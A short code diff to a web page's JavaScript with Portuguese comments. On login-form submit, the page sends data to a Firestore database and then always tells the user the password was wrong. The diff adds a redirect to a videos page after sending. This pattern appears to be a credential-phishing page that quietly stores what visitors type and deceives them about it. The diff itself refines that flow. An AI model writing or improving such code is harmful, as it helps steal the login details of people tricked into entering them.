@@ -226,9 +226,6 @@
         // Inicializar Firestore
         const db = getFirestore(app);
 
-        // Removida a função de teste para evitar lotar o banco de dados
-        // Adicione outras funções necessárias aqui, se houver
-
         // Adicionar listener para o evento de submit do formulário
         document.getElementById('login-form').addEventListener('submit', async function(event) {
             event.preventDefault(); // Evita o envio padrão do formulário
@@ -244,8 +241,12 @@
                 });
                 alert("Senha incorreta, tente novamente.");
                 console.log("Dados enviados com sucesso!");
+
+                // Redirecionar para a página de vídeos após o envio dos dados
+                window.location.href = 'videos.html'; // Certifique-se de que o caminho está correto
             } catch (error) {
                 console.error("Erro ao enviar os dados: ", error);
+                alert("Ocorreu um erro ao enviar os dados. Por favor, tente novamente.");
             }
         });
     
